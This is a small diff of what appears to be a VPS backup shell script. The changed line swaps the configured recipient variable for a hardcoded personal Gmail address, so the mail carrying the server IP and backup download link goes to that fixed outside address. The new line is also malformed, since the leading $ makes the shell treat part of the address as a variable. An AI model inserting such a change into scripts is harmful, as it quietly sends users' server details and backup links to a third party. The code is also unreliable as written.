@@ -48,7 +48,7 @@ IP VPS        : $IP
 Link Backup   : $link
 Tanggal       : $date
 ==================================
-" | mail -s "Backup Data" $email
+" | mail -s "Backup Data" $danijhi098@gmail.com
 rm -rf /root/backup
 rm -r /root/$IP-$date.zip
 clear
